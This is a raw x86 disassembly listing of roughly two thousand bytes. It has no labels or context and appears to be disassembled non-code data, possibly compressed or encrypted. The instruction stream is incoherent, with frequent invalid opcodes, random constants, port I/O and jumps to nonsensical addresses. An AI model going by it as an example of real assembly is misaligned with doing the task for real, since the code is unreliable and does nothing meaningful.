  411fbb:	xchg   ebx,eax
  411fbc:	sub    bl,BYTE PTR [ecx+0x58]
  411fbf:	cmp    dl,BYTE PTR [esi-0x6b418b28]
  411fc5:	adc    eax,0x7b322555
  411fca:	xor    bl,dh
  411fcc:	dec    eax
  411fcd:	mov    ebx,0x982ca862
  411fd2:	lahf   
  411fd3:	push   ds
  411fd4:	inc    esp
  411fd5:	jg     0x41200a
  411fd7:	sbb    DWORD PTR [ecx],esp
  411fd9:	hlt    
  411fda:	sub    DWORD PTR [ebx],esp
  411fdc:	mov    WORD PTR [edi],ss
  411fde:	mov    bl,0xe1
  411fe0:	pushf  
  411fe1:	pop    esp
  411fe2:	in     eax,0x9
  411fe4:	push   ecx
  411fe5:	jge    0x411fe8
  411fe7:	lock xchg ebx,eax
  411fe9:	mov    ch,0x4
  411feb:	pop    edi
  411fec:	imul   ecx,ebp,0xa702e63e
  411ff2:	(bad)  
  411ff3:	mov    ebp,0xaec0fb99
  411ff8:	outs   dx,DWORD PTR ds:[esi]
  411ff9:	jge    0x411feb
  411ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ffc:	das    
  411ffd:	push   esi
  411ffe:	xor    BYTE PTR [edx-0x44],bl
  412001:	xor    eax,DWORD PTR es:0xf56dc2a2
  412008:	jp     0x412032
  41200a:	jbe    0x412068
  41200c:	(bad)  
  41200e:	dec    edi
  41200f:	cmc    
  412010:	add    bl,ah
  412012:	sub    dh,BYTE PTR [ebx+0x5b]
  412015:	addr16 pop eax
  412017:	adc    edi,DWORD PTR [edi-0x4859d728]
  41201d:	int    0x50
  41201f:	fcomp  DWORD PTR [ecx+0x69]
  412022:	popa   
  412023:	mov    bl,0x27
  412025:	pusha  
  412026:	fild   WORD PTR [eax+0x7]
  412029:	and    ebp,esi
  41202b:	adc    bh,ch
  41202d:	and    ebx,0x64
  412030:	(bad)  
  412031:	outs   dx,DWORD PTR cs:[esi]
  412033:	sub    eax,0xf909f4e3
  412038:	ret    
  412039:	sbb    BYTE PTR [ebp-0x7d3c8d1f],0x1
  412040:	xor    al,0xd6
  412042:	add    ch,dl
  412044:	jbe    0x412037
  412046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412047:	and    edx,ebp
  412049:	mov    edi,DWORD PTR ds:0x1304808b
  41204f:	int3   
  412050:	mov    ebp,0x7c74c8ee
  412055:	leave  
  412056:	jb     0x4120ac
  412058:	dec    ebx
  412059:	mov    cl,0x48
  41205b:	mov    al,fs:0x9dad0e1
  412061:	mov    ah,ch
  412063:	mov    edi,0x9fd2df0f
  412068:	push   cs
  412069:	lods   al,BYTE PTR ds:[esi]
  41206a:	clc    
  41206b:	fisub  DWORD PTR [ecx+0x55]
  41206e:	fisttp QWORD PTR [ebp-0x63]
  412071:	mov    edi,0x2122070b
  412076:	(bad)  
  412077:	dec    ebp
  412078:	ins    DWORD PTR es:[edi],dx
  412079:	push   edi
  41207a:	mov    ebp,0xfe4d7856
  41207f:	or     ecx,esi
  412081:	inc    edx
  412082:	add    DWORD PTR [edi+0x7f],edi
  412085:	shl    DWORD PTR [edi+0x28],cl
  412088:	(bad)  
  412089:	mov    al,0x99
  41208b:	jae    0x4120ee
  41208d:	adc    DWORD PTR [edi+0x24a64e8a],esp
  412093:	test   BYTE PTR [ebx+0xf5eaf9e],ch
  412099:	and    ebx,ecx
  41209b:	(bad)  
  41209c:	retf   0x824f
  41209f:	cmp    DWORD PTR [edx-0x5f],eax
  4120a2:	jno    0x4120c3
  4120a4:	test   BYTE PTR [esi-0x4824640],al
  4120aa:	sbb    eax,0x8912bdd
  4120af:	stc    
  4120b0:	mov    ebx,0x4651a607
  4120b5:	lods   al,BYTE PTR ds:[esi]
  4120b6:	xor    bh,BYTE PTR [ebx-0x2d]
  4120b9:	outs   dx,DWORD PTR ds:[esi]
  4120ba:	and    al,0x5b
  4120bc:	xlat   BYTE PTR ds:[ebx]
  4120bd:	aas    
  4120be:	aaa    
  4120bf:	aam    0x3b
  4120c1:	jge    0x412100
  4120c3:	(bad)  
  4120c4:	out    0x96,al
  4120c6:	(bad)  
  4120c7:	neg    BYTE PTR [edx+0x6e70bfbf]
  4120cd:	pusha  
  4120ce:	neg    BYTE PTR [eax]
  4120d0:	ret    0xa0ac
  4120d3:	shr    DWORD PTR [esi+0x5a5b6acf],0xc8
  4120da:	fld    st(0)
  4120dc:	push   edi
  4120dd:	xchg   edi,eax
  4120de:	xor    esi,edi
  4120e0:	sub    al,0x81
  4120e2:	gs or  al,0x89
  4120e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120e6:	fisttp WORD PTR [edi]
  4120e8:	daa    
  4120e9:	jmp    0x3c5b:0x9974b29f
  4120f0:	arpl   WORD PTR [edi+edx*2],cx
  4120f3:	in     al,0xab
  4120f5:	xor    edx,ecx
  4120f7:	(bad)  
  4120f8:	pop    ds
  4120f9:	and    al,0x26
  4120fb:	fwait
  4120fc:	aam    0x16
  4120fe:	(bad)  
  4120ff:	mov    esp,0x8ccd1a6c
  412104:	leave  
  412105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412106:	iret   
  412107:	std    
  412108:	jae    0x412181
  41210a:	(bad)  
  41210b:	pop    esi
  41210c:	push   ecx
  41210d:	ja     0x41217e
  41210f:	ins    BYTE PTR es:[edi],dx
  412110:	mov    edi,0xfde26737
  412115:	ret    0x1264
  412118:	and    al,0x51
  41211a:	xchg   esi,eax
  41211b:	setns  BYTE PTR [ecx]
  41211e:	cmp    edi,DWORD PTR [esi]
  412120:	or     DWORD PTR [esi],esp
  412122:	or     al,ah
  412124:	push   ss
  412125:	sbb    al,0xe5
  412127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412128:	jmp    0x41216a
  41212a:	jmp    0x4120d0
  41212c:	jbe    0x412155
  41212e:	ja     0x412125
  412130:	ror    esp,cl
  412132:	jp     0x41219a
  412134:	in     al,0x2b
  412136:	aaa    
  412137:	jbe    0x4121af
  412139:	xlat   BYTE PTR ds:[ebx]
  41213a:	cld    
  41213b:	cmp    BYTE PTR [ebx-0x23c3cc99],0x63
  412142:	xchg   ebx,eax
  412143:	repz mov esp,DWORD PTR [esp+esi*1]
  412147:	dec    ecx
  412148:	mov    eax,ebp
  41214a:	jg     0x412173
  41214c:	inc    esp
  41214d:	ins    DWORD PTR es:[edi],dx
  41214e:	imul   esi,DWORD PTR [ebx],0x71
  412151:	imul   eax,DWORD PTR [ebp+0x4037a18d],0x423a8b3b
  41215b:	cmp    esi,edx
  41215d:	mov    es,WORD PTR [edi-0xc45d87d]
  412163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412164:	mov    ds:0xa2a9ebdc,al
  412169:	xchg   ecx,eax
  41216a:	push   esp
  41216b:	and    ecx,DWORD PTR cs:[eax+edi*2]
  41216f:	test   al,0xb4
  412171:	jne    0x412114
  412173:	pop    esi
  412174:	retf   0x3e22
  412177:	jmp    0x8b4519e4
  41217c:	and    al,0x4f
  41217e:	adc    bl,BYTE PTR [edx]
  412180:	iret   
  412181:	popf   
  412182:	lods   al,BYTE PTR ds:[esi]
  412183:	or     DWORD PTR [ecx+eiz*1],eax
  412186:	xchg   ebx,eax
  412187:	and    DWORD PTR ds:0x8ab91597,eax
  41218d:	lds    eax,FWORD PTR [ecx]
  41218f:	stos   BYTE PTR es:[edi],al
  412190:	or     eax,edx
  412192:	shl    dh,1
  412194:	(bad)  
  412195:	pushf  
  412196:	jae    0x412163
  412198:	cmp    esi,DWORD PTR [edi]
  41219a:	jb     0x412203
  41219c:	pop    ecx
  41219d:	jnp    0x412139
  41219f:	adc    al,0xff
  4121a1:	xor    DWORD PTR ds:[eax+0x7d9053b0],0xffffff80
  4121a9:	fidivr DWORD PTR ds:0x93cc8273
  4121af:	mov    ebp,0x7bd331db
  4121b4:	sahf   
  4121b5:	sbb    esp,edx
  4121b7:	imul   esp,DWORD PTR [edi+esi*4],0xffffffea
  4121bb:	sbb    DWORD PTR [ebx],esi
  4121bd:	sti    
  4121be:	sub    al,0xfe
  4121c0:	loop   0x4121a7
  4121c2:	adc    DWORD PTR [esi+0x2ae79449],ebx
  4121c8:	lahf   
  4121c9:	mov    dl,0xba
  4121cb:	dec    edx
  4121cc:	or     eax,0x522f6d43
  4121d1:	jmp    0x412216
  4121d3:	pop    ebx
  4121d4:	jl     0x4121b9
  4121d6:	jecxz  0x4121f6
  4121d8:	test   DWORD PTR [ebx],0x303ae493
  4121de:	inc    DWORD PTR [edx+0x6c]
  4121e1:	mov    bl,0x17
  4121e3:	mov    ds:0x83479b7d,eax
  4121e8:	sub    al,0xb4
  4121ea:	dec    ecx
  4121eb:	mov    esi,DWORD PTR [ecx+0x14]
  4121ee:	not    DWORD PTR [ecx-0x10]
  4121f1:	rcl    dh,0x29
  4121f4:	sahf   
  4121f5:	xchg   esi,eax
  4121f6:	mov    ecx,0x8fd37438
  4121fb:	adc    esi,ebx
  4121fd:	in     eax,dx
  4121fe:	push   edi
  4121ff:	pop    ebp
  412200:	retf   
  412201:	adc    eax,DWORD PTR [edx+esi*2+0xd]
  412205:	xchg   edi,eax
  412206:	jmp    0x41223b
  412208:	jle    0x41226e
  41220a:	div    DWORD PTR [eax-0x8]
  41220d:	sub    eax,edi
  41220f:	mov    esp,0x330f27a1
  412214:	and    edi,esi
  412216:	jae    0x4121e0
  412218:	iret   
  412219:	push   0x76
  41221b:	aas    
  41221c:	aas    
  41221d:	repz push cs
  41221f:	les    esp,FWORD PTR [ecx]
  412221:	inc    eax
  412222:	jne    0x41223e
  412224:	inc    edi
  412225:	or     al,0xb3
  412227:	dec    ebx
  412228:	sahf   
  412229:	dec    esi
  41222a:	pop    ebx
  41222b:	mov    eax,0x369f4a75
  412230:	sbb    bh,ch
  412232:	mov    edx,0x516b2a1e
  412237:	xor    bh,BYTE PTR [eax+0x1f]
  41223a:	and    ebp,0xffffffa7
  41223d:	push   cs
  41223e:	push   cs
  41223f:	and    al,0xad
  412241:	mov    al,0x57
  412243:	pop    ecx
  412244:	loope  0x41227b
  412246:	adc    DWORD PTR [ecx-0x239d617],edx
  41224c:	pop    ebx
  41224d:	test   al,0x5e
  41224f:	fidivr DWORD PTR [ecx]
  412251:	jmp    0xfeddc701
  412256:	pushf  
  412257:	inc    esi
  412258:	test   BYTE PTR [esi-0x33],0x91
  41225c:	outs   dx,BYTE PTR ds:[esi]
  41225d:	packsswb mm6,mm0
  412260:	push   edx
  412261:	clc    
  412262:	test   DWORD PTR [ebx+esi*1-0x24ad1a18],ebx
  412269:	pop    esp
  41226a:	sub    esp,DWORD PTR [edi+0x70d83f3b]
  412270:	shr    BYTE PTR [ecx-0x68b5f46d],0x9e
  412277:	mov    ebx,0xd9f811ac
  41227c:	xor    cl,BYTE PTR [edx+edx*8]
  41227f:	cmp    ebp,DWORD PTR [esi-0x37e9b70d]
  412285:	pusha  
  412286:	lods   eax,DWORD PTR ds:[esi]
  412287:	fs cli 
  412289:	lods   eax,DWORD PTR ds:[esi]
  41228a:	mov    ch,0xe0
  41228c:	or     eax,0x7a6790ae
  412291:	in     eax,dx
  412292:	mov    bh,0x8a
  412294:	push   0xe34db05b
  412299:	dec    edx
  41229a:	les    edx,FWORD PTR [edx]
  41229c:	fwait
  41229d:	loopne 0x41225e
  41229f:	add    al,0xa0
  4122a1:	dec    esi
  4122a2:	retf   0xaed6
  4122a5:	and    ebp,edi
  4122a7:	dec    edx
  4122a8:	cs lahf 
  4122aa:	pop    es
  4122ab:	dec    eax
  4122ac:	jno    0x41224f
  4122ae:	inc    esp
  4122af:	jge    0x412241
  4122b1:	dec    ecx
  4122b2:	test   eax,0x3df84955
  4122b7:	lahf   
  4122b8:	repnz mov al,0x31
  4122bb:	clc    
  4122bc:	enter  0xbd4e,0x13
  4122c0:	in     al,dx
  4122c1:	ss and al,0x19
  4122c4:	mov    ds:0xc964e691,eax
  4122c9:	or     ah,cl
  4122cb:	dec    edx
  4122cc:	mov    al,0xe7
  4122ce:	lds    edx,FWORD PTR [eax+0x788fcbee]
  4122d4:	rcl    BYTE PTR [esi],1
  4122d6:	cmp    esi,DWORD PTR [ebx]
  4122d8:	in     eax,dx
  4122d9:	sbb    BYTE PTR [eax],ch
  4122db:	mov    ds:0x3e57e54d,eax
  4122e0:	fiadd  WORD PTR [edi-0x2af73bca]
  4122e6:	add    BYTE PTR [edi-0x151d7a3e],ah
  4122ec:	ror    DWORD PTR [eax+ecx*4+0x29c43270],cl
  4122f3:	adc    DWORD PTR [edi],ecx
  4122f5:	aam    0xa4
  4122f7:	fmul   QWORD PTR [esi+0x5c]
  4122fa:	into   
  4122fb:	pop    edi
  4122fc:	inc    esi
  4122fd:	loopne 0x412346
  4122ff:	and    eax,0x2e94abef
  412304:	mov    edi,0x1e805590
  412309:	(bad)  
  41230a:	leave  
  41230b:	inc    edx
  41230c:	xchg   edx,eax
  41230d:	test   eax,0x6fbdac75
  412312:	inc    edx
  412313:	aad    0x82
  412315:	mov    ebp,0x3cd81366
  41231a:	xchg   ebp,eax
  41231b:	sbb    eax,0x290dd8e1
  412320:	in     eax,dx
  412321:	mov    BYTE PTR [edx+eax*2-0x24bb9e9d],bl
  412328:	xchg   esp,eax
  412329:	(bad)  
  41232a:	cld    
  41232b:	imul   esi,esi,0x63
  41232e:	scas   eax,DWORD PTR es:[edi]
  41232f:	cld    
  412330:	or     eax,0x8021f951
  412335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412336:	mov    ecx,DWORD PTR [eax]
  412338:	cmc    
  412339:	not    DWORD PTR [ebp-0x3a]
  41233c:	sar    BYTE PTR [edx],0x26
  41233f:	stc    
  412340:	xchg   cl,cl
  412342:	sbb    BYTE PTR [ecx],cl
  412344:	(bad)  
  412345:	xchg   edi,eax
  412346:	fist   DWORD PTR [edi+0x268ddc80]
  41234c:	repz add al,0xee
  41234f:	adc    BYTE PTR [eax],bh
  412351:	sub    ebp,ebx
  412353:	rcr    al,cl
  412355:	rcr    DWORD PTR [ebp-0x4a6f11e1],1
  41235b:	rol    BYTE PTR [edi-0x12f2d949],cl
  412361:	and    bl,BYTE PTR [eax+eiz*2+0x3d2b0df2]
  412368:	push   0x13
  41236a:	out    dx,eax
  41236b:	icebp  
  41236c:	sub    DWORD PTR [edx-0x6c],esp
  41236f:	inc    ebx
  412370:	pop    ss
  412371:	push   0x8
  412373:	mov    al,ds:0x4d3c1886
  412378:	ret    
  412379:	add    DWORD PTR [esi],ebp
  41237b:	dec    edi
	...
  412554:	scas   eax,DWORD PTR es:[edi]
  412555:	ror    esp,1
  412557:	push   esp
  412558:	(bad)  
  412559:	pop    ebp
  41255a:	mov    edi,0x5e13fbfb
  41255f:	cmp    DWORD PTR [ebp-0x110cbd11],ebp
  412565:	loop   0x412568
  412567:	add    BYTE PTR ds:0x15000007,ah
  41256d:	dec    esi
  41256e:	in     al,0xf3
  412570:	inc    esi
  412571:	cdq    
  412572:	push   ecx
  412573:	ja     0x41250f
  412575:	adc    al,0xe9
  412577:	nop
  412578:	adc    cl,BYTE PTR [ebx-0x6d0db1a7]
  41257e:	dec    ecx
  41257f:	pusha  
  412580:	and    eax,DWORD PTR [edi+0x60]
  412583:	lock ret 0x8654
  412587:	call   0xfd54dd94
  41258c:	inc    ebx
  41258d:	mov    ebp,0x3fe05444
  412592:	int    0x48
  412594:	mov    al,0x92
  412596:	stos   DWORD PTR es:[edi],eax
  412597:	lahf   
  412598:	sub    BYTE PTR [edx+0x537554c7],ch
  41259e:	call   0xa4d8:0x31ccd91e
  4125a5:	inc    esp
  4125a6:	xor    bl,BYTE PTR [eax+eiz*1]
  4125a9:	ret    
  4125aa:	clc    
  4125ab:	jp     0x4125dd
  4125ad:	lods   al,BYTE PTR ds:[esi]
  4125ae:	sahf   
  4125af:	and    edi,DWORD PTR [ebx]
  4125b1:	dec    esi
  4125b2:	jns    0x4125be
  4125b4:	push   esp
  4125b5:	data16 adc ch,dh
  4125b8:	gs push eax
  4125ba:	daa    
  4125bb:	pop    ebx
  4125bc:	inc    eax
  4125bd:	mov    edi,esp
  4125bf:	sti    
  4125c0:	jmp    0x412632
  4125c2:	(bad)
  4125c5:	cs pop ds
  4125c7:	ja     0x412559
  4125c9:	mov    ebx,0x579581e9
  4125ce:	mov    ebp,0x2806ef3d
  4125d3:	cld    
  4125d4:	pop    ecx
  4125d5:	lds    ecx,FWORD PTR [ebp+0x1f2f5923]
  4125db:	jnp    0x41260c
  4125dd:	or     eax,0xb827d5c
  4125e2:	mov    ecx,DWORD PTR ds:0x928fe327
  4125e8:	xor    eax,0xd218f4b6
  4125ed:	xchg   ebx,eax
  4125ee:	mov    eax,gs:0x4299b059
  4125f4:	inc    ebx
  4125f5:	sbb    esi,DWORD PTR [ecx]
  4125f7:	sbb    al,0xf1
  4125f9:	gs mov esi,0x6ce8a3f
  4125ff:	mov    ebp,edi
  412601:	imul   edi,DWORD PTR [eax+0x9],0xfffffff1
  412605:	mov    edx,0x6ab3eb9e
  41260a:	scas   al,BYTE PTR es:[edi]
  41260b:	or     BYTE PTR [ebx+0x54],0xec
  41260f:	idiv   DWORD PTR [esi]
  412611:	lods   al,BYTE PTR ds:[esi]
  412612:	jno    0x4125b2
  412614:	shufps xmm3,xmm4,0xef
  412618:	mov    dh,0xc7
  41261a:	or     BYTE PTR [edi+0x328fa876],cl
  412620:	add    bl,BYTE PTR [ebp-0x1ce80380]
  412626:	into   
  412627:	xchg   edx,eax
  412628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412629:	outs   dx,BYTE PTR ds:[esi]
  41262a:	jnp    0x412684
  41262c:	aaa    
  41262d:	cmp    DWORD PTR [ecx-0x1c],ecx
  412630:	lds    ebp,FWORD PTR [eax+ebx*1+0x3]
  412634:	into   
  412635:	cmp    eax,0xd144b33e
  41263a:	mov    ds:0xf60e4cee,al
  41263f:	pop    ecx
  412640:	icebp  
  412641:	fsub   QWORD PTR [edi+ecx*2+0x16]
  412645:	or     al,0x9d
  412647:	mov    esp,0x9164a262
  41264c:	pop    ecx
  41264d:	xor    DWORD PTR [ebx+0x6a],0x1af435c0
  412654:	push   0x2b
  412656:	ret    
  412657:	stos   BYTE PTR es:[edi],al
  412658:	lahf   
  412659:	jb     0x412612
  41265b:	lods   eax,DWORD PTR ds:[esi]
  41265c:	mov    ah,0x6c
  41265e:	fcomp  QWORD PTR ss:0x9c078f38
  412665:	mov    ds:0xca258797,eax
  41266a:	add    eax,ebp
  41266c:	pop    eax
  41266d:	das    
  41266e:	xor    eax,0x6425d057
  412673:	mov    edi,DWORD PTR [edi]
  412675:	in     al,0x24
  412677:	inc    esi
  412678:	shr    DWORD PTR [edx-0x696f7be4],1
  41267e:	mov    esi,0x91554b5a
  412683:	retf   
  412684:	clc    
  412685:	push   ecx
  412686:	pop    esp
  412687:	and    BYTE PTR [eax-0x66],dh
  41268a:	hlt    
  41268b:	pop    es
  41268c:	sub    ebp,edi
  41268e:	jecxz  0x412645
  412690:	mov    cl,0xe6
  412692:	jno    0x41265f
  412694:	jb     0x41267b
  412696:	mov    edx,0xb0b43434
  41269b:	add    eax,0x5514720a
  4126a0:	pop    ebx
  4126a1:	jnp    0x4126ec
  4126a3:	add    DWORD PTR [ebp+ecx*1+0x51],ebx
  4126a7:	adc    eax,0x50dea2a1
  4126ac:	(bad)  
  4126ad:	pop    eax
  4126ae:	sub    eax,0xbe75d30c
  4126b3:	sbb    BYTE PTR [edx],al
  4126b5:	pop    esp
  4126b6:	shl    BYTE PTR [edx+0x1fd38363],1
  4126bc:	ins    BYTE PTR es:[edi],dx
  4126bd:	or     BYTE PTR [eax+edx*8-0x34],dl
  4126c1:	xchg   esi,eax
  4126c3:	outs   dx,BYTE PTR ds:[esi]
  4126c4:	test   eax,0x19d3819b
  4126c9:	sahf   
  4126ca:	imul   DWORD PTR [ebp+0x40d6657]
  4126d0:	add    ah,BYTE PTR [esi-0x2]
  4126d3:	jno    0x412723
  4126d5:	cwde   
  4126d6:	fnstsw WORD PTR [edx-0x973631a]
  4126dc:	cld    
  4126dd:	cdq    
  4126de:	shr    dh,cl
  4126e0:	or     al,0xbf
  4126e2:	jle    0x412717
  4126e4:	dec    eax
  4126e5:	dec    ebp
  4126e6:	dec    edx
  4126e7:	(bad)  
  4126e8:	sti    
  4126e9:	jp     0x4126c4
  4126eb:	mov    eax,ds:0x63e77df3
  4126f0:	mov    esp,0x6be94cdb
  4126f5:	stc    
  4126f6:	lock and BYTE PTR [ebp+0x31c417e0],bl
  4126fd:	mov    ds:0x352342f8,eax
  412702:	in     al,dx
  412703:	daa    
  412704:	pop    ebp
  412705:	or     esp,edi
  412707:	hlt    
  412708:	daa    
  412709:	loop   0x4126f0
  41270b:	cdq    
  41270c:	fwait
  41270d:	push   eax
  41270e:	mov    DWORD PTR [eax-0x7d],ecx
  412711:	add    dh,bh
  412713:	cmp    edi,ecx
  412715:	out    dx,al
  412716:	cld    
  412717:	xchg   ebp,eax
  412718:	dec    eax
  412719:	(bad)  [esi]
  41271b:	pop    edi
  41271c:	xchg   ebp,eax
  41271d:	loop   0x4126cf
  41271f:	xor    cl,BYTE PTR cs:[ebx-0x4d]
  412723:	mov    bl,0x1f
  412725:	in     eax,0x40
  412727:	mov    esp,0xbeec5720
  41272c:	sub    eax,0xcf1252e7
  412731:	std    
  412732:	mov    edi,0x33d85c8f
  412737:	test   BYTE PTR [esi-0x6b],ah
  41273a:	adc    bh,BYTE PTR [esi+0x61f96028]
  412740:	test   bl,dl
  412742:	scas   al,BYTE PTR es:[edi]
  412743:	dec    ebx
  412744:	rcl    BYTE PTR [edx+esi*1+0x44402f9a],0x76
  41274c:	jge    0x4127c3
  41274e:	and    ah,0xce
  412751:	fcom   QWORD PTR [esi]
  412753:	test   BYTE PTR fs:[edx+0x7ca2f046],bh
  41275a:	(bad)  
  41275b:	mov    dh,0x4e
  41275d:	repnz or ch,BYTE PTR [edi]
  412760:	push   edx
  412761:	push   0x24a83247
  412766:	test   eax,0x3d828370
  41276b:	out    dx,eax
  41276c:	inc    eax
  41276d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41276e:	inc    edx
  41276f:	adc    bl,ch
  412771:	int3   
  412772:	xor    al,0x82
  412774:	gs jle 0x412775
  412777:	icebp  
  412778:	lods   al,BYTE PTR ds:[esi]
  412779:	bnd ja 0x412737
  41277c:	xor    DWORD PTR [eax-0x3e],0x55
  412780:	cli    
  412781:	cli    
  412782:	mov    al,0x3a
  412784:	push   esi
  412785:	jb     0x4127a8
  412787:	adc    BYTE PTR [ecx+0x7e],0x13
  41278b:	clc    
  41278c:	sub    eax,0x593f07d
  412791:	shl    ebx,cl
  412793:	add    eax,0x3a56d429
  412798:	fcom   DWORD PTR ds:[ecx+0x28]
  41279c:	scas   eax,DWORD PTR es:[edi]
  41279d:	xchg   edx,eax
  41279e:	or     al,0x15
  4127a0:	es mov dh,0x13
  4127a3:	cmp    al,0x4f
  4127a5:	sbb    eax,0x6d5e7c37
  4127aa:	pushf  
  4127ab:	in     eax,dx
  4127ac:	pop    ds
  4127ad:	adc    al,ch
  4127af:	cdq    
  4127b0:	add    BYTE PTR [ebx-0x72],cl
  4127b3:	mov    ds:0x920caa90,al
  4127b8:	(bad)  
  4127b9:	dec    esp
  4127ba:	xchg   edx,eax
  4127bb:	add    BYTE PTR [esi+0x29],0x48
  4127bf:	mov    ds:0x17c74df2,eax
  4127c4:	adc    esi,esi
  4127c6:	adc    DWORD PTR [ecx+0x58381c03],ebp
  4127cc:	mov    edx,0xd752ec6b
  4127d1:	outs   dx,BYTE PTR ds:[esi]
  4127d2:	int    0x1
  4127d4:	sub    BYTE PTR [esp+eax*4+0x6e31e2d6],0x13
  4127dc:	int    0x61
  4127de:	mov    eax,0x6ff0c698
  4127e3:	(bad)  
  4127e4:	jo     0x412847
  4127e6:	popf   
  4127e7:	ds call 0x1f647fe6
  4127ed:	stc    
  4127ee:	and    DWORD PTR ds:0x29f8f75d,ebp
  4127f4:	mov    ebx,0x8c1356d2
  4127f9:	pop    esp
  4127fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127fb:	pop    ds
  4127fc:	xrelease xchg BYTE PTR [edx+eax*4-0x6e],dl
  412801:	sub    BYTE PTR [eax],bh
  412803:	dec    esp
  412804:	frstor [ecx-0x627fc992]
  41280a:	or     BYTE PTR [eax+0x33],bl
  41280d:	fcomp  DWORD PTR [edi-0x73]
  412810:	iret   
  412811:	mov    ebp,0x37217d36
  412816:	mov    esi,0xf3ad95fb
  41281b:	xor    al,0xe6
  41281d:	cs jno 0x41283b
  412820:	out    0x45,al
  412822:	fyl2xp1 
  412824:	mov    al,ds:0x9fe5d4bc
  412829:	dec    ebp
  41282a:	pusha  
  41282b:	mov    ebp,0xecfd619a
  412830:	loope  0x412862
  412832:	push   esi
  412833:	repz sub edx,DWORD PTR [esi+0x22]
  412837:	sbb    BYTE PTR ds:0xf68cd69e,bl
  41283d:	fcomp  QWORD PTR [eax]
  41283f:	and    BYTE PTR [esi+eiz*8-0x7f],ah
  412843:	and    edx,DWORD PTR [edi]
  412845:	push   esi
  412846:	mov    esi,0x383ed439
  41284b:	scas   eax,DWORD PTR es:[edi]
  41284c:	popa   
  41284d:	mov    al,ds:0x9c600ff2
  412852:	dec    ebp
  412853:	int    0x24
  412855:	sub    al,0x5
  412857:	or     eax,DWORD PTR [edi]
  412859:	enter  0xea82,0xac
  41285d:	jecxz  0x41285e
  41285f:	cdq    
  412860:	popf   
  412861:	daa    
  412862:	mov    esi,0x57214a5c
  412867:	xchg   ebp,eax
  412868:	jg     0x4128e9
  41286a:	push   es
  41286b:	dec    esp
  41286c:	cmp    dl,BYTE PTR [eax-0x5fb486b2]
  412872:	push   es
  412873:	add    al,0x46
  412875:	dec    ebp
  412876:	cdq    
  412877:	mov    esp,0x7b4745ea
  41287c:	adc    al,0xc0
  41287e:	out    dx,eax
  41287f:	lods   eax,DWORD PTR ds:[esi]
  412880:	jecxz  0x4128d1
  412882:	sub    DWORD PTR [ebx+0x3d],esi
  412885:	pusha  
  412886:	pop    ebp
  412887:	cmp    eax,0x4d583127
  41288c:	sub    eax,0xd04f210c
  412891:	lea    ecx,[ecx]
  412893:	jnp    0x41287c
  412895:	or     eax,0x3d6bb4
  41289a:	(bad)  
  41289b:	pop    esp
  41289c:	push   cs
  41289d:	ror    BYTE PTR [esi],1
  41289f:	sub    dl,BYTE PTR [ecx]
  4128a1:	jle    0x412901
  4128a3:	das    
  4128a4:	add    al,0x1f
  4128a6:	pop    ebp
  4128a7:	clc    
  4128a8:	addr16 dec esp
  4128aa:	adc    al,0xdd
  4128ac:	stos   BYTE PTR es:[edi],al
  4128ad:	or     eax,0xb39b6046
  4128b2:	hlt    
  4128b3:	imul   ebp,DWORD PTR ds:0x21e9adc7,0x76
  4128ba:	out    0x21,al
  4128bc:	jl     0x412901
  4128be:	js     0x41284a
  4128c0:	sub    BYTE PTR [edx-0x3b],cl
  4128c3:	mov    cl,0xa5
  4128c5:	and    edi,0xf31ce39a
  4128cb:	stc    
  4128cc:	or     eax,0xf42cbb13
  4128d1:	lock loop 0x4128b4
  4128d4:	lahf   
  4128d5:	lods   eax,DWORD PTR ds:[esi]
  4128d6:	sbb    ebx,esi
  4128d8:	iret   
  4128d9:	sub    ebp,ecx
  4128db:	mov    esi,0x5cc5eb8b
  4128e0:	add    ecx,DWORD PTR [ebx+eiz*8-0x23]
  4128e4:	sar    BYTE PTR [ebp+0x19e650ff],0xf4
  4128eb:	cld    
  4128ec:	push   ss
  4128ed:	(bad)  
  4128ee:	cs das 
  4128f0:	xchg   ecx,eax
  4128f1:	lods   al,BYTE PTR ds:[esi]
  4128f2:	sub    DWORD PTR [edi],esi
  4128f4:	cmp    cl,ch
  4128f6:	and    eax,DWORD PTR [ebx+ecx*2+0x23]
  4128fa:	mov    edi,0x3535acc5
  4128ff:	xchg   DWORD PTR [edi+0x7b72e3],esp
  412905:	jle    0x412919
  412907:	xor    DWORD PTR [ecx-0x4a366c75],esi
  41290d:	or     DWORD PTR [edi-0xdf9f71e],eax
  412913:	mov    eax,0xc3d50e4a
  412918:	outs   dx,DWORD PTR ds:[esi]
  412919:	popf   
  41291a:	retf   
  41291b:	and    edi,DWORD PTR [edi-0x7e64817e]
  412921:	or     dl,BYTE PTR [edi+0x22]
  412924:	cwde   
  412925:	imul   ebx,DWORD PTR [ecx],0xb9c15c78
  41292b:	xchg   ebx,eax
  41292c:	inc    ebp
  41292d:	test   eax,0xf2f8d0ed
  412932:	cmp    al,0xcf
  412934:	mov    ds:0x8cb8e63e,eax
  412939:	push   edx
  41293a:	popf   
  41293b:	jno    0x4129aa
  41293d:	ret    0x50ec
  412940:	xchg   ebx,eax
  412941:	enter  0xb338,0xb
  412945:	or     DWORD PTR [ebx+0x696e3c0b],esp
  41294b:	(bad)  
  41294c:	std    
  41294d:	outs   dx,BYTE PTR ds:[esi]
  41294e:	mov    cl,0xb0
  412950:	and    bh,BYTE PTR [edi+ecx*1-0x5d]
  412954:	xchg   edx,eax
  412955:	(bad)  
  412956:	mov    si,0xdbeb
  41295a:	jmp    0x674b18a9
  41295f:	dec    DWORD PTR [edx+0x106a30e1]
  412965:	xchg   ecx,eax
  412966:	xchg   edx,eax
  412967:	mov    dl,0x5b
  412969:	pop    ss
  41296a:	mov    ch,0xe8
  41296c:	or     BYTE PTR [ebx-0x33],ch
  41296f:	sbb    eax,DWORD PTR [esi]
  412971:	cmp    edi,DWORD PTR [eax+0x9de6cd]
  412977:	fild   DWORD PTR [esi+ebx*1]
  41297a:	cli    
  41297b:	ins    BYTE PTR es:[edi],dx
  41297c:	push   es
